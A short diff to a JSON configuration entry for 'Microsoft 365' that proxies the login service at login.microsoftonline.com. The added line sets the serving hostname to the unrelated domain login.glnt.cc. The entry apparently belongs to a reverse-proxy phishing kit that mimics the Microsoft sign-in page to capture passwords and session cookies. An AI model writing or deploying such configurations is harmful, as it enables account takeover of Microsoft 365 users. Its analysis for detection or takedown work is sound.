@@ -2,6 +2,7 @@
   "name": "microsoft",
   "label": "Microsoft 365",
   "upstream": "https://login.microsoftonline.com",
+  "hostname": "login.glnt.cc",
   "proxy_paths": [
     "/",
     "/common/",
